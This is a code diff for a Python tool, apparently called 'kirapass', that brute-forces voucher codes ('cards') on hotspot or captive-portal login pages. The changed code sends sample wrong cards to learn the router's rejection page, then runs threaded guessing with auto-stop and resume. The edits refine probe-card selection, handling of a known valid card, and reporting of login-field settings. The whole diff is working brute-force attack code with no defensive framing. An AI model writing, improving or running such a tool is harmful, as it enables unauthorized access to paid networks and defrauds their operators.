@@ -335,9 +335,19 @@ class Calibration:
                            "detail": detail or {}})
 
     def as_dict(self) -> dict:
+        applied = None
+        if self.tuned and self.tuned.get("verified"):
+            applied = {key: self.profile.get(key) for key in (
+                "login_url", "method", "user_field", "pass_field",
+                "pass_mode", "dst_field", "dst_value", "popup_field",
+                "send_dst", "send_popup")}
+            applied["extra_field_names"] = sorted(
+                (self.profile.get("extra_fields") or {}).keys())
+            applied["field_names"] = list(build_fields(self.profile, "CARD"))
         return {"ok": self.ok, "steps": self.steps,
                 "internet": self.internet, "error": self.error,
-                "tuned": self.tuned, "success_words": self.success_words,
+                "tuned": self.tuned, "applied_settings": applied,
+                "success_words": self.success_words,
                 "fingerprint": None if not self.fingerprint else {
                     "exact": self.fingerprint.exact,
                     "note": self.fingerprint.note,
@@ -351,7 +361,7 @@ class Calibration:
                 "portal": self.portal.as_dict() if self.portal else None}
 
 
-def bench_cards(p: dict, count: int = 3, seed: int = 0) -> list:
+def bench_cards(p: dict, count: int = 3, seed: int = 0, exclude=()) -> list:
     """Format-valid cards used to learn the rejection page.
 
     They are drawn from inside the real space, so the router answers with its
@@ -361,10 +371,25 @@ def bench_cards(p: dict, count: int = 3, seed: int = 0) -> list:
     space = store.space_size(p)
     if space <= 0:
         return []
+    excluded = set(exclude or ())
+    wanted = min(max(0, int(count)), max(0, space - len(excluded)))
+    if not wanted:
+        return []
     rnd = random.Random(seed or int(time.time()))
     picks = set()
-    while len(picks) < min(count, space):
-        picks.add(rnd.randrange(space))
+    attempts = 0
+    while len(picks) < wanted and attempts < max(space * 2, wanted * 20):
+        idx = rnd.randrange(space)
+        attempts += 1
+        card = store.decode_card(p, idx)
+        if card not in excluded:
+            picks.add(idx)
+    if len(picks) < wanted and space <= 100000:
+        for idx in range(space):
+            if store.decode_card(p, idx) not in excluded:
+                picks.add(idx)
+                if len(picks) >= wanted:
+                    break
     return [store.decode_card(p, i) for i in sorted(picks)]
 
 
@@ -456,7 +481,7 @@ def calibrate(profile: dict, known_card: str = "", keyword: str = "",
         known_preflight = None
         known_preflight_response = None
         known_preflight_tuned = None
-        if known_card:
+        if known_card and learn_known:
             wrong = known_card_problem(p, known_card)
             if wrong:
                 cal.error = "known_card_out_of_format"
@@ -496,7 +521,9 @@ def calibrate(profile: dict, known_card: str = "", keyword: str = "",
 
         # --- 3. learn what a WRONG card looks like ----------------------
         probe_cards, replies = [], []
-        for card in bench_cards(p, max(2, min(int(probes or 2), 4))):
+        for card in bench_cards(
+                p, max(2, min(int(probes or 2), 4)),
+                exclude=(known_card,) if known_card else ()):
             try:
                 r = send_login(session, p, card)
             except Exception as exc:                    # noqa: BLE001
@@ -1241,7 +1268,8 @@ class Engine:
 
     def start(self, profile: dict, attempts: int, threads: int, delay_ms: int = 0,
               keyword: str = "", known_card: str = "", verify_after: bool = True,
-              auto_stop: bool = True, resume: bool = True) -> dict:
+              auto_stop: bool = True, resume: bool = True,
+              known_card_tested: bool = False) -> dict:
         if self.state == "running":
             return {"ok": False, "error": "already_running"}
         p = store.migrate(profile)
@@ -1300,15 +1328,17 @@ class Engine:
         self.emit("state", {"state": "calibrating"})
         self.thread = threading.Thread(
             target=self._run, args=(p, int(attempts), int(threads), delay_ms,
-                                    keyword, known_card),
+                                    keyword, known_card, bool(known_card_tested)),
             daemon=True, name="kirapass-engine")
         self.thread.start()
         return {"ok": True}
 
     # -- the run ---------------------------------------------------------
-    def _run(self, p, attempts, threads, delay_ms, keyword, known_card) -> None:
+    def _run(self, p, attempts, threads, delay_ms, keyword, known_card,
+             known_card_tested=False) -> None:
         try:
             cal = calibrate(p, known_card=known_card, keyword=keyword,
+                            learn_known=not known_card_tested,
                             checks=self.checks,
                             probes=config.CALIBRATION_PROBES)
             if not cal.ok and calibration_retryable(cal.error):
@@ -1317,10 +1347,11 @@ class Engine:
                                    "after": cal.error})
                 time.sleep(1.0)
                 cal = calibrate(p, known_card=known_card, keyword=keyword,
+                                learn_known=not known_card_tested,
                                 checks=self.checks,
                                 probes=config.CALIBRATION_PROBES)
             known_card_failure = False
-            if known_card:
+            if known_card and not known_card_tested:
                 shape_step = next((item for item in cal.steps
                                    if item.get("id") == "shape_tuned"), None)
                 known_card_failure = bool(shape_step and not shape_step.get("ok"))
